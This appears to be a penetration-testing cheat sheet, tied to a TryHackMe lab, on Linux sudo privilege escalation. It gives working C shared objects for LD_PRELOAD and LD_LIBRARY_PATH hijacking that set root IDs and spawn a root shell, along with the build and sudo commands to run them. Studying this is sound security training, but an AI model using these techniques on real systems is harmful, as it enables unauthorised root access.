# Sudo Abuse

```
$ sudo -l
[sudo] password for appadmin:
User appadmin may run the following commands on this host:
                (root) /opt/Support/start.sh
```

**Checklist**

* [ ] Write permission to `start.sh`
* [ ] write permission to the `/opt/support`
* [ ] Create `start.sh` if doesn't exist

## **Environment Variables (**[**https://tryhackme.com/room/linuxprivesc**](https://tryhackme.com/room/linuxprivesc)**)**

Check which environment variables are inherited (look for the env\_keep options):

`sudo -l`

**LD\_PRELOAD**

`LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library\*\*.\*\*

```
/* Preload.c */

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`

Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the `LD_PRELOAD` environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

**LD\_LIBRARY\_PATH**

`LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

Run `ldd` against the any program that you can execute as sudo (sudo -l) to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:

```
/* Library_path.c */

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c`

Run program using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp program-name-here`
